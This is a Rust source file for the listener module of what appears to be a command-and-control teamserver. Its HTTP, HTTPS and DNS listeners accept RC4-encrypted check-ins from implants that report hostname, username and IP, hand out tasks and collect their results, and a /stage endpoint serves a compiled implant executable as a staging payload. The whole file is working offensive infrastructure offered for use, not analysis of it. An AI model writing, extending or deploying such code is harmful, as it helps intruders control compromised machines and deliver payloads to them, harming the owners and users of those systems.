mod dns;

use anyhow::Result;
use axum::{
    body::Bytes,
    extract::{State, ConnectInfo},
    routing::{post, get},
    Router,
    http::StatusCode,
    response::IntoResponse,
};
use serde::{Deserialize, Serialize};
use std::net::SocketAddr;
use tokio::sync::{mpsc, oneshot};
use tokio_util::sync::CancellationToken;
use tracing::{info, warn, error};
use axum_server::tls_rustls::RustlsConfig;
use axum_server::Handle;
use std::path::PathBuf;
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::Mutex;
use async_trait::async_trait;

use crate::core::CoreEvent;
use crate::storage::Task;

// --- RC4 Helper ---
pub fn rc4(data: &mut [u8], key: &[u8]) {
    let mut s: Vec<u8> = (0u8..=255).collect();
    let mut j: usize = 0;
    for i in 0..256 {
        j = (j + s[i] as usize + key[i % key.len()] as usize) % 256;
        s.swap(i, j);
    }
    let mut i = 0usize;
    j = 0;
    for byte in data.iter_mut() {
        i = (i + 1) % 256;
        j = (j + s[i] as usize) % 256;
        s.swap(i, j);
        *byte ^= s[(s[i] as usize + s[j] as usize) % 256];
    }
}

pub fn hex_to_bytes(hex: &str) -> [u8; 16] {
    let mut out = [0u8; 16];
    for i in 0..16 {
        out[i] = u8::from_str_radix(&hex[i*2..i*2+2], 16).unwrap_or(0);
    }
    out
}

// --- Listener Trait ---
#[async_trait]
pub trait Listener: Send + Sync {
    async fn run(&self, handle: Handle, token: CancellationToken) -> Result<()>;
    fn id(&self) -> String;
}

// --- Listener Manager ---
pub struct ListenerManager {
    listeners: Arc<Mutex<HashMap<String, (Handle, String)>>>, // ID -> (Handle, Type)
    tx: mpsc::Sender<CoreEvent>,
    token: CancellationToken,
}

impl ListenerManager {
    pub fn new(tx: mpsc::Sender<CoreEvent>, token: CancellationToken) -> Self {
        Self {
            listeners: Arc::new(Mutex::new(HashMap::new())),
            tx,
            token,
        }
    }

    pub async fn start_http(&self, addr: SocketAddr, session_key: String) -> Result<String> {
        let id = format!("http-{}", addr.port());
        let handle = Handle::new();
        let listener = HttpListener::new(id.clone(), addr, self.tx.clone(), None, None, session_key, false);
        
        let h = handle.clone();
        let t = self.token.clone();
        tokio::spawn(async move {
            if let Err(e) = listener.run(h, t).await {
                error!("HTTP Listener {} error: {}", listener.id(), e);
            }
        });

        self.listeners.lock().await.insert(id.clone(), (handle, "HTTP".to_string()));
        Ok(id)
    }

    pub async fn start_https(&self, addr: SocketAddr, cert: PathBuf, key: PathBuf, session_key: String) -> Result<String> {
        let id = format!("https-{}", addr.port());
        let handle = Handle::new();
        let listener = HttpListener::new(id.clone(), addr, self.tx.clone(), Some(cert), Some(key), session_key, true);
        
        let h = handle.clone();
        let t = self.token.clone();
        tokio::spawn(async move {
            if let Err(e) = listener.run(h, t).await {
                error!("HTTPS Listener {} error: {}", listener.id(), e);
            }
        });

        self.listeners.lock().await.insert(id.clone(), (handle, "HTTPS".to_string()));
        Ok(id)
    }

    pub async fn start_dns(&self, addr: SocketAddr, domain: String, session_key: String) -> Result<String> {
        let id = format!("dns-{}", addr.port());
        let listener = dns::DnsListener::new(id.clone(), addr, domain, self.tx.clone(), session_key)?;
        
        let handle = Handle::new(); // Dummy handle for DNS
        let t = self.token.clone();
        tokio::spawn(async move {
            if let Err(e) = listener.run(handle, t).await {
                error!("DNS Listener {} error: {}", listener.id(), e);
            }
        });

        self.listeners.lock().await.insert(id.clone(), (Handle::new(), "DNS".to_string()));
        Ok(id)
    }

    pub async fn list(&self) -> Vec<(String, String)> {
        self.listeners.lock().await.iter()
            .map(|(id, (_, t))| (id.clone(), t.clone()))
            .collect()
    }

    pub fn get_supported_protocols(&self) -> Vec<String> {
        vec!["HTTP".to_string(), "HTTPS".to_string(), "DNS".to_string()]
    }

    pub async fn stop(&self, id: &str) -> bool {
        if let Some((handle, _)) = self.listeners.lock().await.remove(id) {
            handle.graceful_shutdown(Some(std::time::Duration::from_secs(5)));
            return true;
        }
        false
    }
}

// --- HTTPS Listener Implementation ---
#[derive(Clone)]
pub struct ListenerState {
    tx: mpsc::Sender<CoreEvent>,
    session_key: [u8; 16],
}

#[derive(Deserialize, Serialize)]
pub struct CheckinRequest {
    pub agent_id: String,
    pub hostname: String,
    pub username: String,
    pub ip_address: String,
    pub pid: Option<u32>,
    pub arch: Option<String>,
    pub sleep: i32,
}

pub struct HttpListener {
    id: String,
    addr: SocketAddr,
    tx: mpsc::Sender<CoreEvent>,
    cert_path: Option<PathBuf>,
    key_path: Option<PathBuf>,
    session_key_hex: String,
    use_tls: bool,
}

impl HttpListener {
    pub fn new(id: String, addr: SocketAddr, tx: mpsc::Sender<CoreEvent>, cert_path: Option<PathBuf>, key_path: Option<PathBuf>, session_key_hex: String, use_tls: bool) -> Self {
        Self { id, addr, tx, cert_path, key_path, session_key_hex, use_tls }
    }
}

#[async_trait]
impl Listener for HttpListener {
    fn id(&self) -> String { self.id.clone() }

    async fn run(&self, handle: Handle, token: CancellationToken) -> Result<()> {
        let state = ListenerState {
            tx: self.tx.clone(),
            session_key: hex_to_bytes(&self.session_key_hex),
        };

        let app = Router::new()
            .route("/checkin", post(handle_checkin))
            .route("/result", post(handle_result))
            .route("/stage", get(handle_staging))
            .with_state(state);

        if self.use_tls {
            info!("HTTPS Listener {} starting on {}", self.id, self.addr);
            let config = RustlsConfig::from_pem_file(self.cert_path.as_ref().unwrap(), self.key_path.as_ref().unwrap()).await?;
            let server = axum_server::bind_rustls(self.addr, config)
                .handle(handle)
                .serve(app.into_make_service_with_connect_info::<SocketAddr>());

            tokio::select! {
                result = server => { result? }
                _ = token.cancelled() => {
                    info!("HTTPS Listener {} received closure signal", self.id);
                }
            }
        } else {
            info!("HTTP Listener {} starting on {}", self.id, self.addr);
            let server = axum_server::bind(self.addr)
                .handle(handle)
                .serve(app.into_make_service_with_connect_info::<SocketAddr>());

            tokio::select! {
                result = server => { result? }
                _ = token.cancelled() => {
                    info!("HTTP Listener {} received closure signal", self.id);
                }
            }
        }

        Ok(())
    }
}

async fn handle_checkin(
    State(state): State<ListenerState>, 
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    body: Bytes
) -> impl IntoResponse {
    info!("Received checkin request from {} ({} bytes)", addr, body.len());
    let mut data = body.to_vec();
    rc4(&mut data, &state.session_key);

    let payload: CheckinRequest = match serde_json::from_slice(&data) {
        Ok(p) => p,
        Err(e) => {
            warn!("Checkin: failed to parse decrypted body: {}", e);
            return (StatusCode::BAD_REQUEST, Bytes::new()).into_response();
        }
    };

    let (responder_tx, responder_rx) = oneshot::channel();
    let event = CoreEvent::AgentCheckin {
        agent_id: payload.agent_id,
        hostname: payload.hostname,
        username: payload.username,
        ip_address: payload.ip_address,
        external_ip: addr.ip().to_string(),
        sleep: payload.sleep,
        responder: responder_tx,
    };

    if let Err(e) = state.tx.send(event).await {
        warn!("Failed to send checkin event: {}", e);
        return (StatusCode::INTERNAL_SERVER_ERROR, Bytes::new()).into_response();
    }

    let tasks = match responder_rx.await {
        Ok(Ok(t)) => t,
        _ => vec![],
    };

    let response = CheckinResponse { status: "ok".to_string(), tasks };
    let mut resp_bytes = serde_json::to_vec(&response).unwrap_or_default();
    rc4(&mut resp_bytes, &state.session_key);

    (StatusCode::OK, Bytes::from(resp_bytes)).into_response()
}

async fn handle_result(State(state): State<ListenerState>, body: Bytes) -> impl IntoResponse {
    let mut data = body.to_vec();
    rc4(&mut data, &state.session_key);

    let payload: ResultRequest = match serde_json::from_slice(&data) {
        Ok(p) => p,
        Err(e) => {
            warn!("Result: failed to parse decrypted body: {}", e);
            return (StatusCode::BAD_REQUEST, Bytes::new()).into_response();
        }
    };

    let event = CoreEvent::TaskResult {
        task_id: payload.task_id,
        output: payload.output.into_bytes(),
    };

    if let Err(e) = state.tx.send(event).await {
        warn!("Failed to send result event: {}", e);
    }

    let mut resp = b"{\"status\":\"ok\"}".to_vec();
    rc4(&mut resp, &state.session_key);
    (StatusCode::OK, Bytes::from(resp)).into_response()
}

async fn handle_staging() -> impl IntoResponse {
    // Build path relative to the teamserver exe location so it resolves correctly
    // regardless of the working directory the teamserver was launched from.
    // Falls back to the same relative path used by operator/mod.rs serve_stage.
    let path = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.join("../implant/zig-out/bin/lockjaw_implant.exe")))
        .unwrap_or_else(|| PathBuf::from("../implant/zig-out/bin/lockjaw_implant.exe"));

    match tokio::fs::read(&path).await {
        Ok(data) => {
            info!("Serving staging payload ({} bytes) from {:?}", data.len(), path);
            (
                StatusCode::OK,
                [(axum::http::header::CONTENT_TYPE, "application/octet-stream")],
                Bytes::from(data),
            )
                .into_response()
        }
        Err(e) => {
            warn!("Staging request failed: could not read {:?}: {}", path, e);
            StatusCode::NOT_FOUND.into_response()
        }
    }
}

#[derive(Serialize)]
pub struct CheckinResponse {
    pub status: String,
    pub tasks: Vec<Task>,
}

#[derive(Deserialize, Serialize)]
pub struct ResultRequest {
    pub task_id: String,
    pub output: String,
}

